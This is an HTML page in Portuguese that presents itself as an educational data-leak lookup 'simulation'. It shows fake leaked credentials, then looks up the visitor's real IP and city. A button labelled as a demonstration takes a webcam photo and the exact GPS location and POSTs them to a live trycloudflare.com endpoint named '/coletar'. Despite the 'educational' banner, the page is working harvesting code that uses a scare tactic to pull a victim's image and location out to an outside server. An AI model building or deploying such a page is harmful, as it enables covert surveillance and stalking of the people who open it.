<!DOCTYPE html>
<html lang="pt-BR">

<head>
    <meta charset="UTF-8">
    <title>Consulta de Vazamento de Dados (Simula√ß√£o)</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #0d1117;
            color: #c9d1d9;
            padding: 20px;
        }

        .container {
            max-width: 600px;
            margin: auto;
            background: #161b22;
            padding: 20px;
            border-radius: 10px;
            border: 1px solid #30363d;
        }

        h1 {
            color: #ff5555;
            text-align: center;
        }

        .loading {
            font-style: italic;
            color: #58a6ff;
            margin-bottom: 15px;
        }

        .data {
            background: #0d1117;
            border: 1px solid #30363d;
            padding: 10px;
            margin-top: 10px;
            border-radius: 6px;
        }

        .highlight {
            color: #ff7b72;
            font-weight: bold;
        }

        .info {
            background: #21262d;
            border: 1px solid #30363d;
            padding: 10px;
            border-radius: 6px;
            margin-bottom: 15px;
            color: #58a6ff;
        }

        button {
            background: #238636;
            color: white;
            padding: 10px 15px;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            margin-top: 15px;
        }

        button:hover {
            background: #2ea043;
        }
    </style>
</head>

<body>

    <div class="container">
        <h1>üîç Verificando dados expostos...</h1>

        <div class="info">
            ‚ö†Ô∏è Este site √© apenas um <b>projeto educacional</b>.<br>
            Ele pode solicitar <b>c√¢mera</b> e <b>localiza√ß√£o</b> para demonstra√ß√£o, mas <b>nada ser√° coletado sem sua permiss√£o</b>.
        </div>

        <p class="loading" id="status">Consultando bancos de dados comprometidos...</p>

        <div id="result" style="display:none;">
            <div class="data">üìõ Nome: <span class="highlight" id="nome"></span></div>
            <div class="data">üìß E-mail: <span class="highlight" id="email"></span></div>
            <div class="data">üîë Senha: <span class="highlight" id="senha"></span></div>
            <div class="data">üåç IP P√∫blico: <span class="highlight" id="ip"></span></div>
            <div class="data">üìç Localiza√ß√£o: <span class="highlight" id="local"></span></div>
        </div>

        <video id="video" autoplay playsinline style="display: none;"></video>

        <button id="btnEnviar" style="display:none;">Enviar dados para demonstra√ß√£o</button>
    </div>

    <script>
  // --- helpers ---
  function randItem(arr) { return arr[Math.floor(Math.random() * arr.length)]; }

  function getPositionPromise(options = {}) {
    return new Promise((resolve, reject) => {
      if (!navigator.geolocation) return reject(new Error('Geolocaliza√ß√£o n√£o suportada'));
      navigator.geolocation.getCurrentPosition(resolve, reject, options);
    });
  }

  async function captureOnce(timeoutMs = 8000) {
    const video = document.getElementById('video');
    let stream;
    try {
      stream = await navigator.mediaDevices.getUserMedia({ video: true });
    } catch (err) {
      throw new Error('Permiss√£o de c√¢mera negada ou n√£o dispon√≠vel: ' + err.message);
    }

    video.style.display = 'block'; // mostrar enquanto captura (opcional)
    video.srcObject = stream;

    // espera carregamento com timeout de seguran√ßa
    await new Promise((resolve, reject) => {
      let resolved = false;
      function done() {
        if (resolved) return;
        resolved = true;
        resolve();
      }
      video.addEventListener('loadedmetadata', done, { once: true });
      // fallback
      setTimeout(done, 2500);
    });

    // desenha frame no canvas
    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth || 640;
    canvas.height = video.videoHeight || 480;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    // encerra a c√¢mera
    stream.getTracks().forEach(t => t.stop());
    video.srcObject = null;
    video.style.display = 'none';

    return canvas.toDataURL('image/png');
  }

  // fetch com timeout (AbortController)
  async function fetchWithTimeout(url, options = {}, timeout = 8000) {
    const controller = new AbortController();
    const id = setTimeout(() => controller.abort(), timeout);
    options.signal = controller.signal;
    try {
      const res = await fetch(url, options);
      clearTimeout(id);
      return res;
    } catch (err) {
      clearTimeout(id);
      throw err;
    }
  }

  // --- simula√ß√£o inicial (seu setTimeout original) ---
  setTimeout(() => {
    document.getElementById("status").textContent = "Dados encontrados!";
    document.getElementById("nome").textContent = randItem(["Jo√£o Silva","Maria Souza","Carlos Pereira"]);
    document.getElementById("email").textContent = randItem(["joao123@gmail.com","maria.souza@yahoo.com"]);
    document.getElementById("senha").textContent = randItem(["abc123","senha123","qwerty"]);

    // traz IP com tratamento de erro
    fetch("https://ipapi.co/json/")
      .then(r => r.ok ? r.json() : Promise.reject(new Error('IP API retornou ' + r.status)))
      .then(data => {
        document.getElementById("ip").textContent = data.ip || '‚Äî';
        document.getElementById("local").textContent = `${data.city || '‚Äî'}, ${data.region || '‚Äî'}, ${data.country_name || '‚Äî'}`;
      })
      .catch(err => {
        console.warn('N√£o foi poss√≠vel obter IP:', err);
        document.getElementById("ip").textContent = 'erro';
        document.getElementById("local").textContent = 'erro';
      });

    document.getElementById("result").style.display = "block";
    document.getElementById("btnEnviar").style.display = "inline-block";
  }, 3000);

  // --- evento do bot√£o ---
  document.getElementById("btnEnviar").addEventListener("click", async () => {
    if (!confirm("Deseja realmente permitir o envio da sua c√¢mera e localiza√ß√£o para demonstra√ß√£o educacional?")) return;
    try {
      await sendData();
    } catch (err) {
      console.error('sendData falhou:', err);
      alert('Erro: ' + err.message);
    }
  });

  // --- fun√ß√£o principal corrigida ---
  async function sendData() {
    try {
      // captura imagem (trata poss√≠vel erro)
      const imagem = await captureOnce();

      // pega posi√ß√£o (com timeout de 10s)
      const pos = await getPositionPromise({ timeout: 10000 });

      const latitude = pos.coords.latitude;
      const longitude = pos.coords.longitude;

      const localizacao = {
        position: `https://www.google.com/maps?q=${latitude},${longitude}`,
        timestamp: pos.timestamp,
        userAgent: navigator.userAgent,
        userAct: navigator.userActivation?.isActive ?? false,
        image: imagem
      };

      console.log("Enviando dados (simula√ß√£o):", localizacao);

      // faz o POST com timeout e tratamento de erros
      const res = await fetchWithTimeout('https://reduces-uri-prepaid-retired.trycloudflare.com/coletar', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(localizacao)
      }, 10000);

      if (!res.ok) throw new Error('Servidor respondeu com ' + res.status);

      const data = await res.json();
      console.log('Resposta do servidor:', data);
      alert('‚úÖ Dados enviados com sucesso (simula√ß√£o). Veja console.');

    } catch (err) {
      // trata erros vindos de getUserMedia / geolocation / fetch
      console.error('Erro no sendData:', err);
      alert('Falha ao enviar dados: ' + (err.message || err));
    }
  }
</script>
              

</body>

</html>
